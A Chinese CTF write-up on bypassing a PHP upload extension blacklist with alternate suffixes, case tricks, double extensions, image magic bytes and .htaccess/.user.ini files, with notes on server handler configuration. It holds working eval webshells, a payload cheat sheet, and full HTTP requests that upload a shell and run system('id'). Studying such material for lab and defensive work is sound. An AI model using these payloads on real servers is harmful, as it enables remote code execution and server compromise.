## 一句话概括

后端卡的是**扩展名**时，思路是"换一个同样能被 PHP 解析、但校验规则没顾上的后缀"（`php5` / `phtml` / `php3` / `phar`…），或者用大小写、双扩展名、文件头（魔术字节）骗过检查。**能不能解析，取决于服务器把哪些后缀映射给了 PHP 解释器**。

## 本题情景与解题手法

### 题目形态

上传点与前几题相同，但这次把 `filename` 改回 `.php` 后，服务端返回 JSON：

```json
{"code":2,"msg":"\u6587\u4ef6\u7c7b\u578b\u4e0d\u5408\u89c4"}
```

`msg` 是一串 **Unicode 转义（`\uXXXX`）**，解码后是「**文件类型不合规**」：

| 转义 | 字符 | 转义 | 字符 |
|---|---|---|---|
| `\u6587` | 文 | `\u4e0d` | 不 |
| `\u4ef6` | 件 | `\u5408` | 合 |
| `\u7c7b` | 类 | `\u89c4` | 规 |
| `\u578b` | 型 | | |

`code:2` 是非 0 状态码，表示错误。**能拿到这条回显就说明入口定位对了，剩下的是怎么让后缀过关。**

### 第一步：枚举"没被列进黑名单"的 PHP 后缀

原笔记列的候选：

```text
e.php   → e.php5
e.php   → e.phtml
e.php   → e.phps
e.php   → e.php7
```

思路是：后端黑名单往往只列了 `php`，而 `php5`、`phtml`、`php3` 这些"老后缀"常年被漏掉。

### 第二步：遇到"上传成功却直接下载"——后缀没被解析

改后缀为 `php3` 后上传成功，可访问 `/upload/e.php3` 时**浏览器直接下载文件**而不是执行。原笔记的疑问与判断：

> 修改文件名为 `php3` 后访问 `upload/e.php3` 怎么直接下载了？

这是一个**好现象**，说明：

- **上传成功**：后端允许 `.php3` 落地，说明已经绕过了文件类型检查；
- **解析失败**：Web 服务器（Nginx）**没有把 `.php3` 关联到 PHP 解释器**，于是把它当普通文本/二进制文件交给浏览器下载。

也就是说，**"能上传"和"能被解析"是两件事**。后缀必须同时满足"过校验"和"被解析"两个条件。

### 第三步：换一个真能被解析的后缀

原笔记给出的常见可解析后缀清单：

```text
.phtml
.php4
.php5
.php7
.phps
.phar
```

实际测试中，原笔记最终走通的是 **`.php5` / `.Php` / `.php3` 三类变种**（不同环境命中不同，取决于服务器配置）。

### 第四步：如果所有后缀都不行 —— 上传配置文件

```text
### 换方法：上传配置文件 .htaccess 或者 .user.ini
```

这两个配置文件都能**改变服务器的解析规则**，让"本来不能解析的文件"被当作 PHP 执行 —— 具体哪个能用取决于环境（`.htaccess` 要 Apache，`.user.ini` 要 PHP-FPM）。这是最"通用"的一招，**04 篇专门展开 `.user.ini`**。

### 上传手法一句话总结

> **后缀黑名单** → 换成未列黑名单的老后缀（`php5`/`phtml`/`php3`…）→ 若被下载说明该后缀没被解析，换下一个 → 后缀全被卡死时，改为上传 `.htaccess` / `.user.ini` 直接改写解析规则（详见 04 篇）。

## 原理

### 1. 为什么有的后缀能解析、有的不能

决定因素不在 PHP 本身，而在 **Web 服务器怎么把"扩展名"映射到"PHP 解释器"**。

**Apache + mod_php** 常见配置（`httpd.conf` / `php.conf`）：

```apache
# 把指定的多个扩展名都交给 PHP 处理
AddType application/x-httpd-php .php .php3 .php4 .php5 .phtml .phar
# 或者用处理器方式
AddHandler application/x-httpd-php .php
```

**Nginx + php-fpm** 常见配置：

```nginx
# 只匹配以 .php 结尾的路径 -> 交给 php-fpm
location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}
```

对照来看：

| 服务器/配置 | 解析什么后缀 | 结果 |
|---|---|---|
| Nginx `location ~ \.php$` | 只认结尾是 `.php` | `e.php3` 被当静态文件下载 |
| Apache `AddType ... .php3` | 显式列举了 `.php3` | `e.php3` 会被执行 |
| Apache `AddHandler ... .php` | 只登记 `.php` | `e.phtml` 不解析 |

所以原笔记里 `php3` 被下载、`php5` 能跑，**完全由那台服务器的配置决定**，不是 PHP 语言层面的差别。

### 2. 黑名单 vs 白名单

| 类型 | 逻辑 | 典型问题 | 绕过方向 |
|---|---|---|---|
| 黑名单 | 禁止若干后缀（如 `php`、`asp`） | **枚举永远不全** | 找漏网后缀、大小写、双扩展名 |
| 白名单 | 只允许若干后缀（如 `jpg`、`png`） | 本身较严 | 靠 `.user.ini` / `.htaccess` 改规则，或解析差异 |

本题是黑名单式（`.php` 被拦），所以"换后缀"是首选。

### 3. 大小写绕过

如果黑名单是**区分大小写**地比对字符串：

```php
if (strpos($filename, 'php') !== false) die('not allowed');
```

那么 `.Php`、`.PHP`、`.pHp` 里的字母序列并不等于 `php`，可能直接过关；而**在大小写不敏感的文件系统（Linux 上按配置、Windows 上默认）或 Apache 的 `AddType`（大小写不敏感）作用下**，它又确实能被解析 —— 于是就绕过了。原笔记提到试过 **`.Php`** 正是这个思路。

> 反之，若比对用的是 `stripos()` 或正则 `/php/i`，大小写就不管用了（web155 就是这种情况，见 05 篇）。

### 4. 双扩展名

```text
e.php   → e.php.jpg
e.php   → e.jpg.php
```

- **`.php.jpg`**（`php` 在前）：校验若只看**最后一个点之后**的后缀，看到的是 `jpg` → 放行；但服务器多数只解析最后一个后缀，所以通常仍不解析。它主要用于骗"取第一个后缀"的实现。
- **`.jpg.php`**（`php` 在后）：最后一个后缀是 `php` → 大概率被黑名单抓到；但它骗的是"只看第一个后缀 / 只看是否含图片后缀"的检查。历史上有 Apache 的 `AddHandler` 会把 `.jpg.php` 里的 `.jpg` 也当后缀处理的特性（曾导致 `e.php.jpg` 被执行）。

归根结底是**校验程序取后缀的方式**和**服务器解析取后缀的方式**不一致造成的。

### 5. 魔术字节（文件头）绕过

当后端不只查后缀，还**读文件正文开头几个字节**判断"是不是图片"时，就在木马最前面塞上图片的魔术字节：

| 格式 | 魔术字节（十六进制 / 文本） |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A`（`\x89PNG\r\n\x1a\n`） |
| GIF | `47 49 46 38 39 61`（`GIF89a`） |

例如给 GIF 头：

```php
GIF89a;
<?php @eval($_POST['cmd']); ?>
```

或给 PNG 头：

```php
\x89PNG\x0d\x0a\x1a\x0a
<?php @eval($_POST['cmd']); ?>
```

这几个字节在文件正文里属于"合法像素数据"的一部分，浏览器能正常当图片打开，PHP 解析时前面的字节被当作模板文本原样输出、后面的 `<?php ... ?>` 照常执行 —— **一举两得**。

## 利用条件

1. **有上传点**，且文件落到 Web 可访问目录
2. **后端按扩展名放行/拦截**（黑名单或白名单）
3. **改用的后缀在目标服务器上确实被解析**（这要实测；被下载就说明不含）
4. **落盘路径可知**，才能访问验证

## Payload 速查

| 目的 | 做法 |
|---|---|
| 换后缀绕黑名单 | `.php` → `.php5` / `.phtml` / `.php3` / `.php4` / `.php7` / `.phps` / `.phar` |
| 大小写绕 | `.php` → `.Php` / `.PHP` / `.pHp`（对区分大小写的字符串比对有效） |
| 双扩展名 | `e.jpg.php` / `e.php.jpg`（视后端"取后缀"方式而定） |
| 图片头骗内容检查 | 正文开头加 `GIF89a` 或 `\x89PNG\x0d\x0a\x1a\x0a` |
| 换解析规则 | 上传 `.htaccess`（Apache）或 `.user.ini`（PHP-FPM） |

## 完整示例

上传时抓包，把分片里的文件名换成变种后缀：

```http
POST /upload.php HTTP/1.1
Host: 靶机地址
Content-Type: multipart/form-data; boundary=----wb

------wb
Content-Disposition: form-data; name="file"; filename="e.php5"
Content-Type: image/png

<?php @eval($_REQUEST['cmd']); ?>
------wb--
```

访问验证（能执行才是有效后缀，被下载就是无效）：

```http
GET /upload/e.php5?cmd=system('id'); HTTP/1.1
Host: 靶机地址
```

## 踩坑与备注

- **"上传成功"不等于"能解析"**：原笔记里 `php3` 上传成功却返回下载，就是这个坑。判断标准只有一条 —— **访问时命令有没有被执行**。
- **后缀清单因环境而异**：`.php5` 在这题能跑，换一台机器可能就变静态文件。清单只是"候选"，必须实测。
- **Nginx 与 Apache 行为不同**：`location ~ \.php$` 只认 `.php`；Apache `AddType` 可以显式列举多个后缀。题目跑在哪种服务器上，直接决定哪类后缀可用。
- **大小写是否管用，取决于比对函数**：`strpos` 管用，`stripos`/`/i` 不管用。试之前先看回显判断过滤强度。
- **原笔记的最终建议是回头改用配置文件**：当后缀枚举走不通时，`.htaccess` / `.user.ini` 才是"通用解"。这一段在 04 篇展开。
